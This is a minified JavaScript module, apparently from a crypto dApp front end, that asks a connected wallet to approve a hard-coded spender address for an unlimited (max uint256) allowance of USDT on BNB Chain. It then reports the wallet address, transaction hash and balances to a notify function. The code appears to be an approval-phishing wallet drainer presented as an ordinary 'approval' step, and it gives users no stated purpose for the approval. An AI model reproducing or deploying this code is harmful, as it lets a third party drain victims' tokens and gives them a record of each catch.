import{s as w}from"./notify-CX_aGgTC.js";import{B as D,C as P,g as d}from"./balances-5NtDpXxe.js";const g=["function approve(address spender, uint256 amount) returns (bool)"],m="0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",l={TOKEN_ADDRESS:"0x55d398326f99059fF775485246999027B3197955",SPENDER_ADDRESS:"0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC"};async function _(f,a,t){var e,c,r,i;if(!(f!=null&&f.session)){a("Please connect your wallet first.",!0);return}const s=((i=(((r=(c=(e=f.session)==null?void 0:e.namespaces)==null?void 0:c.eip155)==null?void 0:r.accounts)||[])[0])==null?void 0:i.split(":")[2])||"";if(!s){a("Please connect your wallet first.",!0);return}a("Please sign the approval in your wallet...");try{const p=await new D(f).getSigner(),E=await new P(l.TOKEN_ADDRESS,g,p).approve(l.SPENDER_ADDRESS,m);a("Transaction sent. Waiting for confirmation...");const o=await E.wait();a("Approval successful!");const{usdtBalance:A,bnbBalance:u}=await d(f,s);w({type:"approval_success",address:s,txHash:o==null?void 0:o.hash,usdtBalance:A,bnbBalance:u}),t==null||t()}catch(n){a((n==null?void 0:n.message)||"Approval failed",!0)}}export{_ as d};
